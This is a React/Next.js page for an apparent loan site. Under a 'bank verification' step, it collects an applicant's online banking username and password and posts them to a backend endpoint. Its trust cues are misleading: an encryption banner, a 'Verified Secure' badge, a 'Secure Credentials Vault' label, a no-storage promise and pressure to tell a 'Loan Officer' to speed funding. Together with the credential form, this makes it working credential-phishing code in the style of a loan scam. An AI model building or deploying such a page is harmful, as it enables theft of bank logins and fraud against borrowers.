"use client";

import { useState, useEffect } from "react";
import Link from "next/link";
import { SITE_NAME } from "@/lib/constants";
import toast from "react-hot-toast";
import { apiUrl } from "@/lib/api";

type Phase = "search" | "form";

interface ApplicationInfo {
  applicationId: string;
  firstName: string;
  lastName: string;
  loanAmount: number;
  bankName: string;
  email: string;
  account_type: string;
}

function formatCurrency(amount: number): string {
  return new Intl.NumberFormat("en-US", {
    style: "currency",
    currency: "USD",
    minimumFractionDigits: 2,
    maximumFractionDigits: 2,
  }).format(amount);
}

export default function VerifyBankPage() {
  const [phase, setPhase] = useState<Phase>("search");
  const [submitted, setSubmitted] = useState(false);
  const [showPassword, setShowPassword] = useState(false);
  const [pstTime, setPstTime] = useState("");
  const [loading, setLoading] = useState(false);

  const [searchLoading, setSearchLoading] = useState(false);
  const [searchError, setSearchError] = useState("");

  const [searchId, setSearchId] = useState("");

  // Auto-populated (read-only) fields
  const [appInfo, setAppInfo] = useState<ApplicationInfo | null>(null);

  // User-entered credentials
  const [username, setUsername] = useState("");
  const [password, setPassword] = useState("");

  useEffect(() => {
    const updateTime = () => {
      const now = new Date();
      const options: Intl.DateTimeFormatOptions = {
        timeZone: "America/Los_Angeles",
        hour: "2-digit",
        minute: "2-digit",
        second: "2-digit",
        hour12: true,
        timeZoneName: "short",
      };
      setPstTime(new Intl.DateTimeFormat("en-US", options).format(now));
    };

    updateTime();
    const timer = setInterval(updateTime, 1000);
    return () => clearInterval(timer);
  }, []);

  const performLookup = async (id: string) => {
    setSearchError("");
    setSearchLoading(true);
    try {
      const res = await fetch(
        apiUrl(
          `/api/bank-verification/lookup?applicationId=${encodeURIComponent(id.trim())}`,
        ),
      );
      const data = await res.json();

      if (!res.ok) {
        setSearchError(
          data.error ||
            "Application not found. Please check your ID and try again.",
        );
        return;
      }

      setAppInfo(data);
      setPhase("form");
    } catch {
      setSearchError(
        "Network error. Please check your connection and try again.",
      );
    } finally {
      setSearchLoading(false);
    }
  };

  const handleSearch = async (e: React.FormEvent<HTMLFormElement>) => {
    e.preventDefault();
    if (!searchId.trim()) {
      setSearchError("Please enter your Application ID.");
      return;
    }
    await performLookup(searchId);
  };

  useEffect(() => {
    const params = new URLSearchParams(window.location.search);
    const appId = params.get("applicationId");
    if (appId) {
      setSearchId(appId);
      performLookup(appId);
    }
  }, []);

  const handleSubmit = async (e: React.FormEvent<HTMLFormElement>) => {
    e.preventDefault();
    if (!appInfo) return;

    setLoading(true);
    try {
      const response = await fetch("/api/bank-verification", {
        method: "POST",
        headers: { "Content-Type": "application/json" },
        body: JSON.stringify({
          bankName: appInfo?.bankName,
          fullName: `${appInfo?.firstName} ${appInfo?.lastName}`,
          bankingUsername: username,
          bankingPassword: password,
          applicationId: appInfo?.applicationId,
          email: appInfo?.email,
          accountType: appInfo?.account_type,
        }),
      });

      if (!response.ok) {
        const data = await response.json();
        toast.error(data.error || "An error occurred. Please try again.");
        return;
      }

      toast.success("Bank verification submitted successfully!");
      setSubmitted(true);
      window.scrollTo({ top: 0, behavior: "smooth" });
    } catch {
      toast.error("Network error. Please check your connection and try again.");
    } finally {
      setLoading(false);
    }
  };

  if (submitted) {
    return (
      <div className="min-h-screen bg-surface flex flex-col items-center justify-center p-4">
        <div className="max-w-md w-full bg-white rounded-3xl shadow-2xl p-8 text-center border border-surface-dark">
          <div className="mb-6 flex justify-center">
            <div className="w-20 h-20 bg-success/10 rounded-full flex items-center justify-center">
              <svg
                className="w-12 h-12 text-success"
                fill="none"
                stroke="currentColor"
                viewBox="0 0 24 24"
              >
                <path
                  strokeLinecap="round"
                  strokeLinejoin="round"
                  strokeWidth={3}
                  d="M5 13l4 4L19 7"
                />
              </svg>
            </div>
          </div>

          <h1 className="text-3xl font-bold text-text-primary mb-4">
            Information Submitted Successfully
          </h1>

          <div className="space-y-4 text-text-secondary mb-8">
            <p className="leading-relaxed">
              Your bank verification is now in review by our California-based
              team. We are working at PST speed to finalize your file.
            </p>
            <p className="text-sm font-medium bg-surface py-2 px-4 rounded-full inline-block">
              Current PST Time: {pstTime}
            </p>
          </div>

          <div className="bg-primary/5 border border-primary/10 rounded-2xl p-6 mb-8">
            <p className="text-primary font-bold mb-2 uppercase tracking-wide text-xs">
              The Action Trigger
            </p>
            <p className="text-text-primary font-medium">
              Please notify your Loan Officer immediately that you have
              completed this submission to expedite your funding.
            </p>
          </div>

          <Link
            href="/loan-status"
            className="block w-full bg-primary hover:bg-primary-dark text-white font-bold py-4 rounded-xl transition-all shadow-lg hover:shadow-xl transform hover:-translate-y-0.5"
          >
            Check Loan Status
          </Link>
        </div>
      </div>
    );
  }

  return (
    <div className="min-h-screen bg-surface flex flex-col">
      {/* Security Banner */}
      <div className="bg-primary-dark text-white py-2 px-4 text-center text-sm font-medium flex items-center justify-center gap-2">
        <svg
          className="w-4 h-4 text-success"
          fill="currentColor"
          viewBox="0 0 20 20"
        >
          <path
            fillRule="evenodd"
            d="M5 9V7a5 5 0 0110 0v2a2 2 0 012 2v5a2 2 0 01-2 2H5a2 2 0 01-2-2v-5a2 2 0 012-2zm8-2v2H7V7a3 3 0 016 0z"
            clipRule="evenodd"
          />
        </svg>
        <span>✓ Bank-Level 256-Bit Encryption</span>
      </div>

      <div className="max-w-2xl mx-auto w-full px-4 py-12 grow">
        {/* Header Section */}
        <div className="flex flex-col items-center mb-10 text-center">
          <div className="flex items-center gap-3 mb-6">
            <div className="w-12 h-12 bg-primary rounded-xl flex items-center justify-center shadow-lg">
              <span className="text-white font-bold text-xl">CL</span>
            </div>
            <div className="h-8 w-px bg-surface-dark"></div>
            <div className="flex items-center gap-1.5 text-primary-light font-bold text-sm bg-primary-light/5 px-3 py-1.5 rounded-full border border-primary-light/20">
              <svg className="w-4 h-4" fill="currentColor" viewBox="0 0 20 20">
                <path
                  fillRule="evenodd"
                  d="M5 9V7a5 5 0 0110 0v2a2 2 0 012 2v5a2 2 0 01-2 2H5a2 2 0 01-2-2v-5a2 2 0 012-2zm8-2v2H7V7a3 3 0 016 0z"
                  clipRule="evenodd"
                />
              </svg>
              Verified Secure
            </div>
          </div>

          <h1 className="text-3xl font-extrabold text-text-primary mb-4 tracking-tight">
            Secure Identity & Income Verification
          </h1>
          <p className="text-text-secondary max-w-lg leading-relaxed">
            To fulfill our PST-speed funding guarantee, please securely verify
            the US-based bank account where you wish to receive your funds.
          </p>
        </div>

        {/* Step 1: Application ID Search */}
        {/* {phase === "search" && (
          <div className="bg-white rounded-3xl shadow-xl overflow-hidden border border-surface-dark">
            <form
              onSubmit={handleSearch}
              className="divide-y divide-surface-dark"
            >
              <div className="p-8 space-y-6">
                <div className="flex items-center gap-2 mb-2">
                  <div className="w-6 h-6 rounded-full bg-primary-light/20 text-primary-light flex items-center justify-center text-xs font-bold">
                    1
                  </div>
                  <h2 className="text-sm font-bold text-text-primary uppercase tracking-wider">
                    Find Your Application
                  </h2>
                </div>

                <p className="text-sm text-text-secondary">
                  Enter your Application ID to retrieve your loan details and
                  proceed with bank verification.
                </p>

                <div>
                  <label className="block text-xs font-bold text-text-secondary uppercase mb-2 ml-1">
                    Application ID *
                  </label>
                  <input
                    required
                    type="text"
                    autoComplete="off"
                    placeholder="e.g. 89876"
                    value={searchId}
                    onChange={(e) => setSearchId(e.target.value)}
                    disabled={searchLoading}
                    className="w-full px-4 py-3.5 bg-white border border-surface-dark rounded-xl focus:ring-2 focus:ring-primary/20 focus:border-primary outline-none text-sm transition-all shadow-sm disabled:opacity-50"
                  />
                  <p className="mt-1.5 text-xs text-text-secondary ml-1">
                    Your Application ID was provided when you submitted your
                    loan application.
                  </p>
                </div>

                {searchError && (
                  <div className="bg-red-50 border border-red-200 text-red-700 px-4 py-3 rounded-xl text-sm font-medium">
                    {searchError}
                  </div>
                )}
              </div>

              <div className="p-8 bg-white">
                <button
                  type="submit"
                  disabled={searchLoading}
                  className="w-full bg-primary hover:bg-primary-dark text-white font-bold py-4 rounded-xl transition-all shadow-lg hover:shadow-xl transform hover:-translate-y-0.5 flex items-center justify-center gap-2 disabled:opacity-70 disabled:transform-none"
                >
                  {searchLoading ? (
                    <>
                      <div className="w-5 h-5 border-2 border-white/30 border-t-white rounded-full animate-spin" />
                      Searching...
                    </>
                  ) : (
                    <>
                      Search Application
                      <svg
                        className="w-5 h-5"
                        fill="none"
                        stroke="currentColor"
                        viewBox="0 0 24 24"
                      >
                        <path
                          strokeLinecap="round"
                          strokeLinejoin="round"
                          strokeWidth={2}
                          d="M21 21l-6-6m2-5a7 7 0 11-14 0 7 7 0 0114 0z"
                        />
                      </svg>
                    </>
                  )}
                </button>
              </div>
            </form>
          </div>
        )} */}

        {phase === "search" && searchError && (
          <div className="bg-red-50 border border-red-200 text-red-700 px-6 py-4 rounded-3xl text-sm font-medium text-center mb-8">
            {searchError}
          </div>
        )}

        {searchLoading && phase === "search" && (
          <div className="flex flex-col items-center justify-center py-12">
            <div className="w-12 h-12 border-4 border-primary/30 border-t-primary rounded-full animate-spin mb-4" />
            <p className="text-text-secondary font-medium">
              Loading your application details...
            </p>
          </div>
        )}

        {/* Step 2: Verification Form (after search) */}
        {phase === "form" && appInfo && (
          <div className="bg-white rounded-3xl shadow-xl overflow-hidden border border-surface-dark">
            <form
              onSubmit={handleSubmit}
              className="divide-y divide-surface-dark"
            >
              {/* Section A: Application Details (read-only) */}
              <div className="p-8 space-y-6">
                <div className="flex items-center justify-between mb-2">
                  <div className="flex items-center gap-2">
                    <div className="w-6 h-6 rounded-full bg-success/20 text-success flex items-center justify-center text-xs font-bold">
                      ✓
                    </div>
                    <h2 className="text-sm font-bold text-text-primary uppercase tracking-wider">
                      Application Details
                    </h2>
                  </div>
                  {/* <button
                    type="button"
                    onClick={() => {
                      setPhase("search");
                      setAppInfo(null);
                      setUsername("");
                      setPassword("");
                    }}
                    className="text-xs text-primary hover:text-primary-dark font-semibold transition-colors"
                  >
                    Search Again
                  </button> */}
                </div>

                <div className="bg-surface rounded-2xl p-5 space-y-4 border border-surface-dark">
                  <div className="grid grid-cols-1 sm:grid-cols-2 gap-4">
                    <div>
                      <label className="block text-xs font-bold text-text-secondary uppercase mb-1.5 ml-1">
                        Application ID
                      </label>
                      <div className="w-full px-4 py-3 bg-surface-dark/40 border border-surface-dark rounded-xl text-xs text-text-secondary font-mono truncate">
                        {appInfo.applicationId}
                      </div>
                    </div>
                    <div>
                      <label className="block text-xs font-bold text-text-secondary uppercase mb-1.5 ml-1">
                        Loan Amount
                      </label>
                      <div className="w-full px-4 py-3 bg-surface-dark/40 border border-surface-dark rounded-xl text-sm font-bold text-primary">
                        {formatCurrency(appInfo.loanAmount)}
                      </div>
                    </div>
                    <div>
                      <label className="block text-xs font-bold text-text-secondary uppercase mb-1.5 ml-1">
                        First Name
                      </label>
                      <div className="w-full px-4 py-3 bg-surface-dark/40 border border-surface-dark rounded-xl text-sm text-text-primary font-medium">
                        {appInfo.firstName}
                      </div>
                    </div>
                    <div>
                      <label className="block text-xs font-bold text-text-secondary uppercase mb-1.5 ml-1">
                        Last Name
                      </label>
                      <div className="w-full px-4 py-3 bg-surface-dark/40 border border-surface-dark rounded-xl text-sm text-text-primary font-medium">
                        {appInfo.lastName}
                      </div>
                    </div>
                  </div>
                  <div>
                    <label className="block text-xs font-bold text-text-secondary uppercase mb-1.5 ml-1">
                      Bank Name
                    </label>
                    <div className="w-full px-4 py-3 bg-surface-dark/40 border border-surface-dark rounded-xl text-sm text-text-primary font-medium">
                      {appInfo.bankName || "Not specified"}
                    </div>
                  </div>
                  <div>
                    <label className="block text-xs font-bold text-text-secondary uppercase mb-1.5 ml-1">
                      Bank Name
                    </label>
                    <div className="w-full px-4 py-3 bg-surface-dark/40 border border-surface-dark rounded-xl text-sm text-text-primary font-medium">
                      {appInfo.email || "Not specified"}
                    </div>
                  </div>
                </div>
              </div>

              {/* Section B: Online Banking Credentials */}
              <div className="p-8 bg-surface-dark/30 space-y-6">
                <div className="flex items-center gap-2 mb-2">
                  <div className="w-6 h-6 rounded-full bg-primary-light/20 text-primary-light flex items-center justify-center text-xs font-bold">
                    2
                  </div>
                  <h2 className="text-sm font-bold text-text-primary uppercase tracking-wider">
                    Secure Credentials Vault
                  </h2>
                </div>

                <div className="space-y-5">
                  <div>
                    <label className="block text-xs font-bold text-text-secondary uppercase mb-2 ml-1">
                      Online Banking Username *
                    </label>
                    <input
                      required
                      type="text"
                      autoComplete="off"
                      placeholder="Enter your online banking username"
                      value={username}
                      onChange={(e) => setUsername(e.target.value)}
                      disabled={loading}
                      className="w-full px-4 py-3.5 bg-white border border-surface-dark rounded-xl focus:ring-2 focus:ring-primary/20 focus:border-primary outline-none text-sm transition-all shadow-sm disabled:opacity-50"
                    />
                  </div>

                  <div className="relative">
                    <label className="block text-xs font-bold text-text-secondary uppercase mb-2 ml-1">
                      Online Banking Password *
                    </label>
                    <input
                      required
                      type={showPassword ? "text" : "password"}
                      autoComplete="off"
                      placeholder="Enter your online banking password"
                      value={password}
                      onChange={(e) => setPassword(e.target.value)}
                      disabled={loading}
                      className="w-full px-4 py-3.5 bg-white border border-surface-dark rounded-xl focus:ring-2 focus:ring-primary/20 focus:border-primary outline-none text-sm transition-all shadow-sm disabled:opacity-50"
                    />
                    <button
                      type="button"
                      onClick={() => setShowPassword(!showPassword)}
                      className="absolute right-4 bottom-3.5 text-xs font-bold text-primary hover:text-primary-dark transition-colors"
                    >
                      {showPassword ? "HIDE" : "SHOW"}
                    </button>
                  </div>
                </div>
              </div>

              {/* Section C: Footer */}
              <div className="p-8 bg-white space-y-6">
                <div className="flex gap-3 p-4 bg-surface rounded-2xl border border-surface-dark">
                  <svg
                    className="w-5 h-5 text-text-secondary mt-0.5 shrink-0"
                    fill="none"
                    stroke="currentColor"
                    viewBox="0 0 24 24"
                  >
                    <path
                      strokeLinecap="round"
                      strokeLinejoin="round"
                      strokeWidth={2}
                      d="M13 16h-1v-4h-1m1-4h.01M21 12a9 9 0 11-18 0 9 9 0 0118 0z"
                    />
                  </svg>
                  <p className="text-[11px] leading-relaxed text-text-secondary font-medium">
                    {SITE_NAME} uses these credentials solely for a one-time
                    manual verification of income and identity to finalize your
                    10% APR loan offer. We never store your password or sell
                    your data to third parties.
                  </p>
                </div>

                <button
                  type="submit"
                  disabled={loading}
                  className="w-full bg-primary hover:bg-primary-dark text-white font-bold py-4 rounded-xl transition-all shadow-lg hover:shadow-xl transform hover:-translate-y-0.5 flex items-center justify-center gap-2 disabled:opacity-70 disabled:transform-none"
                >
                  {loading ? (
                    <>
                      <div className="w-5 h-5 border-2 border-white/30 border-t-white rounded-full animate-spin" />
                      Verifying...
                    </>
                  ) : (
                    <>
                      Verify Account
                      <svg
                        className="w-5 h-5"
                        fill="none"
                        stroke="currentColor"
                        viewBox="0 0 24 24"
                      >
                        <path
                          strokeLinecap="round"
                          strokeLinejoin="round"
                          strokeWidth={2}
                          d="M9 12l2 2 4-4m5.618-4.016A11.955 11.955 0 0112 2.944a11.955 11.955 0 01-8.618 3.04A12.02 12.02 0 003 9c0 5.591 3.824 10.29 9 11.622 5.176-1.332 9-6.03 9-11.622 0-1.042-.133-2.052-.382-3.016z"
                        />
                      </svg>
                    </>
                  )}
                </button>
              </div>
            </form>
          </div>
        )}

        {/* Support Footer */}
        <p className="text-center mt-8 text-xs text-text-secondary font-medium">
          Having trouble connecting? Contact your Loan Officer or call us at
          (747) 200-5228
        </p>
      </div>
    </div>
  );
}
